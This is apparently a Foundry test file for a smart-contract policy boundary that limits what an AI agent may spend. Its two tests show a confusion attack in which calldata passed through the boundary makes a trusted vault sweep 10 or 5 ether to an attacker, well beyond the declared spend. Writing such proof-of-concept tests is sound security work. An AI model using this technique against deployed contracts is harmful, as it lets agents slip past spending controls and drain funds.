// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {AkmenaCore} from "../../../src/core/AkmenaCore.sol";
import {AkmenaPolicyBoundary} from "../../../src/authorization/AkmenaPolicyBoundary.sol";

contract TrustedVault {
    address public immutable trustedExecutor;

    constructor(address _trustedExecutor) {
        trustedExecutor = _trustedExecutor;
    }

    receive() external payable {}

    function sweep(address payable recipient, uint256 amount) external {
        require(msg.sender == trustedExecutor, "NOT_TRUSTED_EXECUTOR");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "TRANSFER_FAILED");
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack_PolicyActionConfusionTest is Test {
    AkmenaCore internal core;
    AkmenaPolicyBoundary internal boundary;
    TrustedVault internal vault;

    address internal operator = address(0x1111);
    address internal agent = address(0x2222);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        core = new AkmenaCore();
        boundary = new AkmenaPolicyBoundary(address(core));

        vault = new TrustedVault(address(boundary));

        vm.deal(address(vault), 10 ether);

        vm.prank(operator);
        boundary.setAgentPolicy(
            agent,
            1 ether,
            1 ether,
            false
        );
    }

    function test_Attack_AuthorizedPolicyCanExecuteOversizedPrivilegedAction() public {
        uint256 vaultBefore = address(vault).balance;
        uint256 attackerBefore = attacker.balance;

        bytes memory payload = abi.encodeWithSelector(
            TrustedVault.sweep.selector,
            payable(attacker),
            10 ether
        );

        vm.prank(agent);

        boundary.executeAgentCall(
            operator,
            address(vault),
            1 ether,
            bytes32(0),
            0,
            payload
        );

        assertEq(
            address(vault).balance,
            0,
            "CRITICAL: privileged target action was not executed"
        );

        assertEq(
            attacker.balance,
            attackerBefore + 10 ether,
            "CRITICAL: attacker did not receive oversized transfer"
        );

        assertEq(
            vaultBefore - address(vault).balance,
            10 ether,
            "CRITICAL: actual target value exceeded policy spend"
        );
    }

    function test_Attack_ZeroDeclaredSpendCanStillTriggerPrivilegedAction() public {
        uint256 attackerBefore = attacker.balance;

        bytes memory payload = abi.encodeWithSelector(
            TrustedVault.sweep.selector,
            payable(attacker),
            5 ether
        );

        vm.prank(agent);

        boundary.executeAgentCall(
            operator,
            address(vault),
            0,
            bytes32(0),
            0,
            payload
        );

        assertEq(
            attacker.balance,
            attackerBefore + 5 ether,
            "CRITICAL: zero-declared-spend privileged action executed"
        );
    }
}
